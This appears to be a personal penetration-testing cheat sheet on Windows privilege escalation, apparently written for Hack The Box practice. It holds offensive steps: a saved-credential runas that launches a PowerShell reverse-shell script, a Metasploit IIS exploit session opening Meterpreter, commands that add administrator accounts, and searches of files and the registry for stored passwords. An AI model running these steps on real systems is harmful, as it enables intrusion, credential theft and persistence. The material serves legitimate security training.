
# Privilege escalation


Read : https://github.com/AlessandroZ/BeRoot/tree/master/Windows



## Get System info
````
> systeminfo | findstr /B /C:"Name" /C:"Version"
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600

> ver
Microsoft Windows [version 10.0.18362.295]

> wmic os get Caption, CSDVersion /value
Caption=Microsoft Windows 10 Professionnel
CSDVersion=
````

Version found in Licenses files
````
type c:\windows\system32\license.rtf 
c:\windows\system32\licenses\*
c:\windows\system32\eula.txt
````

more => http://www.fuzzysecurity.com/tutorials/16.html

hostname
````

Name	                            Version	    Build	Release Date	RTM Date
Windows 95	                        4.00        950	    1995-08-24	
Windows 95 OEM Service Release 1    4.00        950 A	1996-02-14	
Windows 95 OEM Service Release 2    4.00        950 B	1996-08-24	
Windows 95 OEM Service Release 2.1  4.00        950 B	1997-08-27	
Windows 95 OEM Service Release 2.5  4.00        950 C	1997-11-26	
Windows 98                          4.10        1998	1998-05-15	
Windows 98 Second Edition (SE)      4.10        2222	1999-05-05	
Windows Me                          4.90        3000	2000-09-14	2000-06-19
Windows NT 3.1                      3.10        511	    1993-07-27	
Windows NT 3.1, Service Pack 3      3.10        528	    1994-11	
Windows NT 3.5                      3.50        807	    1994-09-21	
Windows NT 3.51                     3.51        1057	1995-05-30	
Windows NT 4.0                      4.0	        1381	1996-08-24	1996-07-31
Windows 2000                        5.0	        2195	2000-02-17	1999-12-15
Windows XP                          5.1	        2600	2001-10-25	2001-08-24
Windows XP, Service Pack 1          5.1	        2600.1105-1106	2002-09-09	
Windows XP, Service Pack 2          5.1	        2600.2180	2004-08-25	
Windows XP, Service Pack 3          5.1	        2600	2008-04-21	
Windows Server 2003                 5.2	        3790	2003-04-24	
Windows Server 2003, Service Pack 1 5.2	        3790.1180	2005-03-30	
Windows Server 2003, Service Pack 2 5.2	        3790	2007-03-13	
Windows Server 2003 R2              5.2	        3790	2005-12-06	2005-12-06
Windows Home Server                 5.2	        4500	2007-11-04	2007-07-16
Windows Vista                       6.0	        6000	2007-01-30	2006-11-08
Windows Vista, Service Pack 1       6.0	        6001	2008-02-04	
Windows Vista, Service Pack 2       6.0	        6002	2009-05-26	2009-04-28
Windows Server 2008                 6.0	        6001	2008-02-27	2008-02-04
Windows Server 2008, Service Pack 2 6.0	        6002	2009-05-26	
Windows Server 2008, Service Pack 2, Rollup KB4489887	6.0	6003	2019-03-19	
Windows 7                           6.1	        7600	2009-10-22	2009-07-22
Windows 7, Service Pack 1           6.1	        7601	2011-02-22	
Windows Server 2008 R               6.1	        7600	2009-10-22	2009-07-22
Windows Server 2008 R2, Service Pack 1	6.1	7601	2011-02-22	2011-02-09
Windows Home Server 2011            6.1	        8400	2011-04-06	2011-04-06
Windows Server 2012                 6.2	        9200	2012-09-04	2012-08-01
Windows 8                           6.2	        9200	2012-10-26	2012-08-01
Windows 8.1                         6.3	        9600	2013-08-27	2013-10-17
Windows Server 2012 R2              6.3	        9600	2013-10-18	2013-08-27
Windows 10, Version 1507            10.0	    10240	2015-07-29	2015-07-15
Windows 10, Version 1511            10.0	    10586	2015-11-10	
Windows 10, Version 1607            10.0	    14393	2016-08-02	
Windows 10, Version 1703            10.0	    15063	2017-04-05	
Windows 10, Version 1709            10.0	    16299	2017-10-17	
Windows 10, Version 1803            10.0	    17134	2018-04-30	
Windows 10, Version 1809            10.0	    17763	2018-10-02	
Windows 10, Version 1903            10.0    	18362	2019-05-21	
Windows Server 2016, Version 1607   10.0	    14393	2016-08-02	
Windows Server 2016, Version 1709   10.0	    16299	2017-10-17	
Windows Server 2019, Version 1809   10.0	    17763	2018-10-02	

````


## Get 64bit OS ?
```
>WMIC OS get osarchitecture
WMIC OS get osarchitecture
OSArchitecture  
64-bit          
```
Info on 32/64 bits : https://ss64.com/nt/syntax-64bit.html

## Is process 32 bit ?
```
> echo %PROCESSOR_ARCHITEW6432%
AMD64 => 32 bits
Rien => 64 bits
```

## Upgrade 32 bit cmd to 64 bit
```
> C:\Windows\sysnative\cmd.exe
```
C:\Windows\SysWOW64\cmd.exe   : 64
C:\Windows\System32\cmd.exe   : 32


## Powershell version
```
$PSVersionTable

Name                           Value                                           
----                           -----                                           
CLRVersion                     2.0.50727.4927                                  
BuildVersion                   6.1.7600.16385                                  
PSVersion                      2.0                                             
WSManStackVersion              2.0                                             
PSCompatibleVersions           {1.0, 2.0}                                      
SerializationVersion           1.1.0.1                                         
PSRemotingProtocolVersion      2.1                                             
```

## Powershell cmd
```
& 'D:\Server\PSTools\PsExec.exe' @('\\1.1.1.1', '-accepteula', '-d', '-i', $id, '-h', '-u', 'domain\user', '-p', 'password', '-w', 'C:\path\to\the\app', 'java', '-jar', 'app.jar')
```
Just put paths or connection strings in one array item and split the other things in one array item each.




## Get User info

````
net user
net user (username)
````

Some others
````
echo %username%
whoami
echo %username%
echo %userprofile%
net localgroup
net config Workstation | find "User name"
query user
wmic useraccount get name
wmic /node: "127.0.0.1" computersystem get username
qwinsta
cmdkey /list
````

## Get stored credentials
````
> cmdkey /list
Currently stored credentials:
    Target: Domain:interactive=ACCESS\Administrator
                               Type: Domain Password
    User: ACCESS\Administrator
````
And use them
````
runas /user:ACCESS\administrator /savecred "powershell -ExecutionPolicy Bypass -File C:\Users\security\AppData\Local\Temp\Invoke-PowerShellTcp.ps1"
````
## Meterpreter

https://zero-day.io/windows-privilege-escalation-exploit-suggester/


````
# msfconsole
         
msf > use windows/iis/iis_webdav_scstoragepathfromurl
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOST 10.10.10.14
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
[*] Meterpreter session 1 opened (10.10.14.30:4444 -> 10.10.10.14:1031) at 2019-09-01 07:46:19 +0200

ps
Migrate xxx

trl-Z  : put session 1 in background

Background session 1? [y/N]  
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf post(multi/recon/local_exploit_suggester) > exploit

[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 40 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed

````


## Network info
````
ipconfig /all
route print
arp -A            : Arp table for All interfaces
netstat -ano      : Actives connections

netsh firewall show state  
netsh firewall show config
````


## Check installed programs, permissions, and hidden files:
````
dir /q                     : quick format
dir /r                     : resursive
attrib -h *.*              : 
````

List of installed programs
````
> wmic /node: "127.0.0.1" product get name, version
Name                                             Version
Blender                                          2.79.2
Microsoft Visual Studio 2015 Tools for Unity     2.2.0.0
Microsoft Visual Studio 2017 Tools for Unity     3.1.0.0
````

Detail of installed programs
````
> wmic product get /format:list 
AssignmentType=1
Caption=Visual C++ Compiler/Tools Premium X86 X64 Cross Resource Package
Description=Visual C++ Compiler/Tools Premium X86 X64 Cross Resource Package
IdentifyingNumber={EF764423-A8DC-35FB-B547-6F0F5D09F665}
InstallSource=C:\ProgramData\Package Cache\{EF764423-A8DC-35FB-B547-6F0F5D09F665}v14.0.23506\packages\VisualC_D14\VC_PremTools.X86.X64.Res\enu\
InstallState=5
Language=1033
LocalPackage=C:\WINDOWS\Installer\308043f.msi
Name=Visual C++ Compiler/Tools Premium X86 X64 Cross Resource Package
PackageCache=C:\WINDOWS\Installer\308043f.msi
PackageCode={03977CCE-21AF-45BC-A6F1-BF89D44CF720}
PackageName=VC_PremTools.X86.X64.Res.msi
Vendor=Microsoft Corporation
Version=14.0.23506
````
 
## Manual escalation commands
````
net user username password /add
net localgroup Administrators username /add
net localgroup "Remote Desktop Users" username /add
psexec.exe -accepteula \\hostname -u hostname\username -p password cmd /c net user username password /add
runas /user:hostname\username explorer.exe
reg.exe save
icacls.exe
reg.exe query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultUserName
reg.exe query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword
````

SAM file locations
````

````


## Running services
````
net start                        : started services
sc query type= service
sc qc (service)
Get-Service -DisplayName "Service"
Get-CimInstance Win32_Service -Filter "Name='Service'" | Format-List -Property *
````

## Scheduled tasks/jobs
````
schtasks
schtasks /query /v /fo LIST
Get-ScheduledTask | Where State -EQ 'Ready'
tasklist /SVC                                : links running processes to started services.
````

## Driver list
````
DRIVERQUERY
````
 
## Netcat for windows
    Precompiled : not tested
    https://joncraton.org/files/nc111nt.zip (can be detected by AV)
    https://joncraton.org/files/nc111nt_safe.zip

    Sources
    https://github.com/diegocr/netcat


## Add users
    Windows: net user username password /add
    net localgroup Administrators username /add
    net localgroup "Remote Desktop Users" username /add

 Sources:
 - https://blackwintersecurity.com/


 # WMIC tool

XP did not allow access to WMIC from a low privileged account. 
Windows 7 Professional and Windows 8 Enterprise allowed low privilege users to use WMIC

````
wmic /?                 : help
````
[exploits/windows/wmic_info.bat](exploits/windows/wmic_info.bat)
http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar

# Find missing patches

````
wmic qfe get Caption,Description,HotFixID,InstalledOn

Caption                                     Description      HotFixID   InstalledOn
http://support.microsoft.com/?kbid=2727528  Security Update  KB2727528  11/23/2013
http://support.microsoft.com/?kbid=2729462  Security Update  KB2729462  11/26/2013
http://support.microsoft.com/?kbid=2736693  Security Update  KB2736693  11/26/2013
http://support.microsoft.com/?kbid=2737084  Security Update  KB2737084  11/23/2013
http://support.microsoft.com/?kbid=2742614  Security Update  KB2742614  11/23/2013
````
Look for privilege escalation exploits and look up their respective KB patch numbers. 
- KiTrap0D (KB979682)
- MS11-011 (KB2393802)
- MS10-059 (KB982799)
- MS10-021 (KB979683)
- MS11-080 (KB2592799). 

After enumerating the OS version and Service Pack you should find out which privilege escalation vulnerabilities could be present. Using the KB patch numbers you can grep the installed patches to see if any are missing.
````
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
````

# Finding remote admin config files

c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

````


# This is a sample from sysprep.inf with clear-text credentials.

[GuiUnattended]
OEMSkipRegional=1
OemSkipWelcome=1
AdminPassword=s3cr3tp4ssw0rd
TimeZone=20

# This is a sample from sysprep.xml with Base64 "encoded" credentials. Please people Base64 is not
encryption, I take more precautions to protect my coffee. The password here is "SuperSecurePassword".

<LocalAccounts>
    <LocalAccount wcm:action="add">
        <Password>
            <Value>U3VwZXJTZWN1cmVQYXNzd29yZA==</Value>
            <PlainText>false</PlainText>
        </Password>
        <Description>Local Administrator</Description>
        <DisplayName>Administrator</DisplayName>
        <Group>Administrators</Group>
        <Name>Administrator</Name>
    </LocalAccount>
</LocalAccounts>

# Sample from Unattended.xml with the same "secure" Base64 encoding.

<AutoLogon>
    <Password>
        <Value>U3VwZXJTZWN1cmVQYXNzd29yZA==</Value>
        <PlainText>false</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <Username>Administrator</Username>
</AutoLogon>
````

# Group Policy Preference saved passwords

When the box you compromise is connected to a domain it is well worth looking for the Groups.xml file which is stored in SYSVOL. Any authenticated user will have read access to this file. 
The password in the xml file is "obscured" from the casual user by encrypting it with AES, I say obscured because the static key is published on the msdn website allowing for easy decryption of the stored value. (http://www.fuzzysecurity.com/tutorials/images/priv05_big.png)

In addition to Groups.xml several other policy preference files can have the optional "cPassword" attribute set:
- Services\Services.xml: Element-Specific Attributes
- ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
- Printers\Printers.xml: SharedPrinter Element
- Drives\Drives.xml: Element-Specific Attributes
- DataSources\DataSources.xml: Element-Specific Attributes

Use from Get-GPPPassword from PowerSploit (https://github.com/PowerShellMafia/PowerSploit) to get all automaticaly

# AlwaysInstallElevated

This will only work if both registry keys contain "AlwaysInstallElevated" with DWORD values of 1.
````
C:\Windows\system32> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
C:\Windows\system32> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
````

# Find files with interresting names

The command below will search the file system for file names containing certain keywords. You can
specify as many keywords as you wish.
    C:\Windows\system32> dir /s *pass* == *cred* == *vnc* == *.config*

Grep files for keyword, this can generate a lot of output.
    C:\Windows\system32> findstr /si password *.xml *.ini *.txt

Similarly the two commands below can be used to grep the registry for keywords, in this case "password".
    C:\Windows\system32> reg query HKLM /f password /t REG_SZ /s
    C:\Windows\system32> reg query HKCU /f password /t REG_SZ /s


## Microsoft Sysinternal

[tools/SysinternalsSuite.zip](tools/SysinternalsSuite.zip)
Download at https://docs.microsoft.com/fr-fr/sysinternals/downloads/sysinternals-suite

Query, configure and manage windows services.
````
C:\Windows\system32> sc qc Spooler

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\spoolsv.exe
        LOAD_ORDER_GROUP   : SpoolerGroup
        TAG                : 0
        DISPLAY_NAME       : Print Spooler
        DEPENDENCIES       : RPCSS
                           : http
        SERVICE_START_NAME : LocalSystem
````

List permissions that each user level has.
"accesschk.exe -ucqv *" to list all services.
````
C:\> accesschk.exe -ucqv Spooler

Spooler

  R  NT AUTHORITY\Authenticated Users
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  R  BUILTIN\Power Users
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
````


Read more : http://www.fuzzysecurity.com/tutorials/16.html


Getting Credentials : http://www.fuzzysecurity.com/tutorials/18.html


# PowerSploit

https://github.com/PowerShellMafia/PowerSploit


# Windows Hacking Pack
Set of tool for exploitation
https://github.com/51x/WHP


# Sherlock
deprecated, replaced by Watson
https://github.com/rasta-mouse/Sherlock


# Watson : Analyse and suggest exploits for windows
https://github.com/rasta-mouse/Watson
use of Watson in HTB:Devel box : https://0xdf.gitlab.io/2019/03/05/htb-devel.html#privesc-web--system
Identify .net version, compile watson for this version, tranfert & run


# Get .Net version
```
> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727
```

# Precompiled Windows kernel exploits: 
- https://github.com/abatchy17/WindowsExploits
- https://github.com/AusJock/Privilege-Escalation/tree/master/Windows
- https://github.com/SecWiki/windows-kernel-exploits

MS11-046 : spawn a system shell in remote shell

Be root: https://github.com/AlessandroZ/BeRoot

## MSF exploit suggester
```
msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester

msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1

msf5 post(multi/recon/local_exploit_suggester) > options 

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > run
```

=> use exploit/windows/local/ms10_015_kitrap0d

# 
https://github.com/51x/WHP
List of CVE


# Powershell version
```
powershell -Command "$PSVersionTable.PSVersion"
```

## Writable dir

- C:\Users\Public\Documents : Windows 2008 and 2012 
- C:\Documents and Settings\All Users\Documents :  Windows 2003 
 
## Offensive BinSploit
https://github.com/offensive-security/exploitdb-bin-sploits


## Exploit choice

https://github.com/SecWiki/windows-kernel-exploits/raw/master/win-exp-suggester/2017-06-14-mssb.xls


## Workshop
- Win32 PE workshop : https://github.com/sagishahar/lpeworkshop

- BeRoot project : https://github.com/AlessandroZ/BeRoot

## Kernel exploits

    https://github.com/SecWiki/windows-kernel-exploits





## Exploit suggester

```
# cp ../../../tools/windows-exploit-suggester.py .

root@kali:~/htb/YoloToolbox/machines/htb/granny# python windows-exploit-suggester.py -u
[*] initiating winsploit version 3.3...
[+] writing to file 2019-09-08-mssb.xls
[*] done
root@kali:~/htb/YoloToolbox/machines/htb/granny# python windows-exploit-suggester.py -i systeminfo.txt -d 2019-09-08-mssb.xls
[*] initiating winsploit version 3.3...
```



Read next 
To watch : 
- Encyclopedia of win escalation : https://www.youtube.com/watch?v=kMG8IsCohHA
- https://www.youtube.com/watch?v=_8xJaaQlpBo

http://www.greyhathacker.net/?p=738
